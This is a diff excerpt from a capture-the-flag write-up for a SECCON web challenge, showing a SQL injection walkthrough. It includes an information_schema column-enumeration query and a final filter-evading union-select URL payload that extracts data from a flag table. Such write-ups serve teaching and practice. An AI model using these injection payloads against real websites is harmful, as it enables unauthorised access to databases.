@@ -53,7 +53,7 @@ We know that the table name is flag. We need to get the column name now.
 
 Select * from (select * from (select group_concat(column_name) from information_schema.columns where table_schema=database()) as a join (select 2) as b) as c join (select 1) as d; 
 
-	This will dump all the columns of the tables in that database. For more clarity you can dump it table wise just change table_schema to table_name=’<table_name>’. Now just get the column piece from the flag table you’ll get the other half also.
+This will dump all the columns of the tables in that database. For more clarity you can dump it table wise just change table_schema to table_name=’<table_name>’. Now just get the column piece from the flag table you’ll get the other half also.
 
 ### Final payload:
 http://web-search.chal.seccon.jp/?q=%27/**/union/**/select/**/*/**/from/**/(select/**/*/**/from/**/(select/**/piece/**/from/**/flag)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b)/**/as/**/c/**/join/**/(select/**/1)/**/as/**/d;%00
